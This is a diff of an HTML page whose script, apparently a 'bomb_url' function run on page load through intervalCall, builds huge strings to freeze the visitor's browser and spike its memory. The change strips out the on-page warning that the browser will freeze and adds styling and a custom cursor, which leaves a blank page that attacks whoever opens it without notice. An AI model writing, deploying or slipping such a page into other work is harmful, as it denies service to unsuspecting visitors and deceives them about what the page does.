@@ -1,8 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script> 
+	
+<style type="text/css">
+	html, body {
+    width: 100%;
+    height: 100%;
+}
+</style>
 
+<script> 
 	function bomb_url() {
 	  var total = "";
 	  for( var i = 0; i < 10000; i++ ) {
@@ -19,11 +26,7 @@
 </script>
 </head>
 
-<body onload="intervalCall()" style="background:#00000">
-
-<div>
-	<p> Sit back and relax 5 to 10 sec, you browser will be freezed with spiking memory!</p>
-</div>
-
+<body onload="intervalCall()" style="background:#00000; cursor: url('cursor.png') 128 128, crosshair;">
 </body>
+
 </html>
